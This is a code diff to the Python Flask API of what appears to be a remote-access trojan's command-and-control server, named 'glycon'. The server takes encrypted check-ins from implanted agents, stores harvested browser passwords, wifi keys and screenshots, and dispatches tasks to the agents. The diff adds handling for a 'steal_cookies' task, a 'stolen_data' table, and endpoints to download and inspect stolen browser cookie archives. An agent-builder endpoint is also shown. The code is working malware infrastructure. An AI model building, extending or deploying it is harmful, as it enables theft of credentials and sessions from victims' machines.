@@ -1,12 +1,14 @@
-﻿from flask import jsonify, request, Response, send_from_directory
+﻿import os
+import sqlite3
+from flask import jsonify, request, Response, send_from_directory
 from flask_login import login_required
+from datetime import datetime
+import json
+import base64
+import traceback
+from werkzeug.security import generate_password_hash
 from glycon.secure_comms import SecureComms
 from glycon.config import CONFIG
-from datetime import datetime
-import sqlite3
-import traceback
-import json
-import base64, os
 
 def init_api_routes(app, socketio):
     @app.route('/api/task', methods=['POST'])
@@ -39,22 +41,21 @@ def init_api_routes(app, socketio):
             task_data = data.get('task_data', {})
             
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
-                     (None, 
-                      data['agent_id'], 
-                      data['task_type'], 
-                      json.dumps(task_data),
-                      'pending', 
-                      datetime.now().isoformat().split('.')[0].replace('T', ' '), 
-                      None))
+                    (None, 
+                    data['agent_id'], 
+                    data['task_type'], 
+                    json.dumps(task_data),
+                    'pending', 
+                    datetime.now().isoformat(), 
+                    None))
             
             conn.commit()
             task_id = c.lastrowid
             
-            # Update agent's ws_connected status if this is a websocket task
             if data['task_type'] == 'websocket':
                 ws_connected = 1 if data.get('action') == 'start' else 0
                 c.execute("UPDATE agents SET ws_connected=? WHERE id=?",
-                         (ws_connected, data['agent_id']))
+                        (ws_connected, data['agent_id']))
                 conn.commit()
             
             conn.close()
@@ -71,6 +72,7 @@ def init_api_routes(app, socketio):
             })
 
         except Exception as e:
+            app.logger.error(f"Error creating task: {str(e)}")
             return jsonify({
                 "status": "error", 
                 "message": str(e)
@@ -86,7 +88,9 @@ def init_api_routes(app, socketio):
 
             try:
                 data = SecureComms.decrypt(request.data)
+                app.logger.debug(f"Received checkin from agent: {data['agent_id']}")
             except Exception as e:
+                app.logger.error(f"Decryption error: {str(e)}")
                 return Response(SecureComms.encrypt({'type': 'noop'}),
                               mimetype='application/octet-stream')
 
@@ -94,7 +98,6 @@ def init_api_routes(app, socketio):
             conn.execute("PRAGMA journal_mode=WAL")
             c = conn.cursor()
 
-            # Check if agent exists and get current ws_connected status
             c.execute("SELECT ws_connected FROM agents WHERE id=?", (data['agent_id'],))
             agent = c.fetchone()
             current_ws_status = agent[0] if agent else 0
@@ -105,7 +108,7 @@ def init_api_routes(app, socketio):
                       data.get('hostname', 'UNKNOWN'),
                       data.get('ip', '0.0.0.0'),
                       data.get('os', 'UNKNOWN'),
-                      datetime.now().isoformat().split('.')[0].replace('T', ' '),
+                      datetime.now().isoformat(),
                       'online',
                       data.get('privilege', 'user'),
                       current_ws_status))
@@ -121,9 +124,10 @@ def init_api_routes(app, socketio):
                                   cred.get('url', ''),
                                   cred.get('username', ''),
                                   cred.get('password', ''),
-                                  datetime.now().isoformat().split('.')[0].replace('T', ' ')))
+                                  datetime.now().isoformat()))
                     except Exception as e:
-                        pass
+                        app.logger.error(f"Error storing credential: {str(e)}")
+                        continue
 
                 for wifi in creds.get('wifi', []):
                     try:
@@ -134,9 +138,10 @@ def init_api_routes(app, socketio):
                                   '',
                                   wifi.get('ssid', ''),
                                   wifi.get('password', ''),
-                                  datetime.now().isoformat().split('.')[0].replace('T', ' ')))
+                                  datetime.now().isoformat()))
                     except Exception as e:
-                        pass
+                        app.logger.error(f"Error storing wifi: {str(e)}")
+                        continue
 
             if 'screenshot' in data:
                 try:
@@ -152,9 +157,9 @@ def init_api_routes(app, socketio):
                                 VALUES (?, ?, ?, ?)''',
                              (None, data['agent_id'],
                               image_data,
-                              datetime.now().isoformat().split('.')[0].replace('T', ' ')))
+                              datetime.now().isoformat()))
                 except Exception as e:
-                    pass
+                    app.logger.error(f"Error storing screenshot: {str(e)}")
 
             c.execute('''SELECT id, task_type, task_data FROM tasks 
                          WHERE agent_id=? AND status='pending'
@@ -180,12 +185,13 @@ def init_api_routes(app, socketio):
                           mimetype='application/octet-stream')
 
         except Exception as e:
+            app.logger.error(f"Checkin error: {str(e)}")
             if conn:
                 conn.rollback()
                 conn.close()
             return Response(SecureComms.encrypt({'type': 'noop'}),
                           mimetype='application/octet-stream')
- 
+
     @app.route('/api/screenshots/<int:screenshot_id>', methods=['DELETE'])
     @login_required
     def delete_screenshot(screenshot_id):
@@ -212,6 +218,7 @@ def init_api_routes(app, socketio):
             return jsonify({"status": "success"}), 200
             
         except Exception as e:
+            app.logger.error(f"Error deleting screenshot: {str(e)}")
             if conn:
                 conn.rollback()
             return jsonify({"status": "error", "message": str(e)}), 500
@@ -224,25 +231,52 @@ def init_api_routes(app, socketio):
         conn = None
         try:
             data = SecureComms.decrypt(request.data)
+            app.logger.debug(f"Received task result for task ID: {data['task_id']}")
             
             conn = sqlite3.connect(CONFIG.database)
-            conn.execute("PRAGMA journal_mode=WAL")
             c = conn.cursor()
             
-            # Update task status
             c.execute('''UPDATE tasks SET status='completed', completed_at=?
                         WHERE id=?''', 
-                    (datetime.now().isoformat().split('.')[0].replace('T', ' '), 
+                    (datetime.now().isoformat(), 
                     data['task_id']))
             
-            # Handle WebSocket connection status
+            if data['task_type'] == 'steal_cookies' and 'results' in data.get('result', {}):
+                app.logger.info(f"Processing {len(data['result']['results'])} cookie packages")
+                
+                for result in data['result']['results']:
+                    try:
+                        if 'zip_content' not in result:
+                            app.logger.error("Missing zip_content in result")
+                            continue
+                            
+                        zip_content = base64.b64decode(result['zip_content'])
+                        if not zip_content:
+                            app.logger.error("Empty zip content")
+                            continue
+                        
+                        c.execute('''INSERT INTO stolen_data 
+                                    (agent_id, browser, data_type, content, system_info, timestamp)
+                                    VALUES (?, ?, ?, ?, ?, ?)''',
+                                (data['agent_id'],
+                                result['browser'],
+                                'cookies',
+                                sqlite3.Binary(zip_content),
+                                json.dumps(result.get('system_info', {})),
+                                datetime.now().isoformat()))
+                        
+                        app.logger.info(f"Stored {result['browser']} cookies")
+                        
+                    except Exception as e:
+                        app.logger.error(f"Failed to store {result['browser']} cookies: {str(e)}")
+                        continue
+            
             if data['task_type'] == 'websocket':
                 ws_connected = 1 if (data['result'].get('status') == 'success' and 
                                 'connected' in data['result'].get('message', '').lower()) else 0
                 c.execute('''UPDATE agents SET ws_connected=? WHERE id=?''',
                         (ws_connected, data['agent_id']))
                 
-                # Notify terminal interface of WebSocket status change
                 socketio.emit('ws_status', {
                     'agent_id': data['agent_id'],
                     'action': data['result'].get('action', ''),
@@ -250,7 +284,6 @@ def init_api_routes(app, socketio):
                     'message': data['result'].get('message', '')
                 }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
             
-            # Handle terminal output
             if data['task_type'] == 'terminal' and data['result'].get('terminal', False):
                 socketio.emit('terminal_output', {
                     'agent_id': data['agent_id'],
@@ -266,25 +299,25 @@ def init_api_routes(app, socketio):
                     image_data = base64.b64decode(data['result']['screenshot'])
                     c.execute('''INSERT INTO screenshots 
                                 VALUES (?, ?, ?, ?)''',
-                                (None, data['agent_id'], 
-                                image_data,
-                                datetime.now().isoformat().split('.')[0].replace('T', ' ')))
+                            (None, data['agent_id'], 
+                             image_data,
+                             datetime.now().isoformat()))
                 except Exception as e:
-                    pass
-            
+                    app.logger.error(f"Error storing screenshot: {str(e)}")
+
             if data['task_type'] == 'harvest_creds' and 'credentials' in data['result']:
                 for cred in data['result']['credentials']:
                     try:
                         c.execute('''INSERT INTO credentials 
                                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'], cred.get('browser', ''), 
-                                cred.get('url', ''), cred.get('username', ''), cred.get('password', ''),
-                                datetime.now().isoformat().split('.')[0].replace('T', ' ')))
+                                 cred.get('url', ''), cred.get('username', ''), cred.get('password', ''),
+                                 datetime.now().isoformat()))
                     except Exception as e:
+                        app.logger.error(f"Error storing credential: {str(e)}")
                         pass
             
             conn.commit()
-            conn.close()
             
             socketio.emit('task_complete', {
                 'task_id': data['task_id'],
@@ -295,11 +328,38 @@ def init_api_routes(app, socketio):
             return jsonify({'status': 'success'})
         
         except Exception as e:
+            app.logger.error(f"Task result processing error: {str(e)}")
             if conn:
-                conn.rollback()
-                conn.close()
+                try:
+                    conn.rollback()
+                except:
+                    pass
             return jsonify({'status': 'error', 'message': str(e)}), 500
+        finally:
+            if conn:
+                conn.close()
+
+    @app.route('/api/download_stolen_data/<int:data_id>')
+    @login_required
+    def download_stolen_data(data_id):
+        conn = sqlite3.connect(CONFIG.database)
+        c = conn.cursor()
         
+        c.execute("SELECT browser, content FROM stolen_data WHERE id=?", (data_id,))
+        data = c.fetchone()
+        conn.close()
+        
+        if not data:
+            return jsonify({"status": "error", "message": "Data not found"}), 404
+        
+        browser, content = data
+        return Response(
+            content,
+            mimetype='application/zip',
+            headers={
+                'Content-Disposition': f'attachment; filename={browser}_cookies.zip'
+            }
+        )
 
     @app.route('/api/generate_agent', methods=['POST'])
     @login_required
@@ -309,11 +369,9 @@ def init_api_routes(app, socketio):
             if not data:
                 return jsonify({"status": "error", "message": "No data provided"}), 400
 
-            # Create agents directory if it doesn't exist
             agents_dir = os.path.join(app.root_path, 'agents')
             os.makedirs(agents_dir, exist_ok=True)
 
-            # Prepare configuration
             config = {
                 'checkin_interval': max(5, min(int(data.get('checkin_interval', 10)), 3600)),
                 'server_url': data.get('server_url', request.url_root).strip('/'),
@@ -321,7 +379,6 @@ def init_api_routes(app, socketio):
                 'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100))
             }
 
-            # Read template
             template_path = os.path.join(app.root_path, 'templates', 'agent_template.py')
             if not os.path.exists(template_path):
                 return jsonify({"status": "error", "message": "Agent template not found"}), 500
@@ -329,7 +386,6 @@ def init_api_routes(app, socketio):
             with open(template_path, 'r') as f:
                 template = f.read()
 
-            # Generate agent code
             agent_code = template.format(
                 checkin_interval=config['checkin_interval'],
                 server_url=config['server_url'],
@@ -337,7 +393,6 @@ def init_api_routes(app, socketio):
                 screenshot_frequency=config['screenshot_frequency']
             )
 
-            # Save agent file
             agent_path = os.path.join(agents_dir, 'agent.py')
             with open(agent_path, 'w') as f:
                 f.write(agent_code)
@@ -362,3 +417,30 @@ def init_api_routes(app, socketio):
         if not os.path.exists(os.path.join(agents_dir, 'agent.py')):
             return jsonify({"status": "error", "message": "Agent file not found"}), 404
         return send_from_directory(agents_dir, 'agent.py', as_attachment=True)
+
+    @app.route('/api/debug/cookies')
+    @login_required
+    def debug_cookies():
+        conn = sqlite3.connect(CONFIG.database)
+        c = conn.cursor()
+        
+        c.execute("SELECT COUNT(*) FROM stolen_data WHERE data_type='cookies'")
+        count = c.fetchone()[0]
+        
+        c.execute('''SELECT id, browser, LENGTH(content), timestamp 
+                     FROM stolen_data 
+                     WHERE data_type='cookies' 
+                     ORDER BY timestamp DESC LIMIT 1''')
+        latest = c.fetchone()
+        
+        conn.close()
+        
+        return jsonify({
+            "cookie_count": count,
+            "latest_entry": {
+                "id": latest[0] if latest else None,
+                "browser": latest[1] if latest else None,
+                "size_bytes": latest[2] if latest else None,
+                "timestamp": latest[3] if latest else None
+            }
+        })
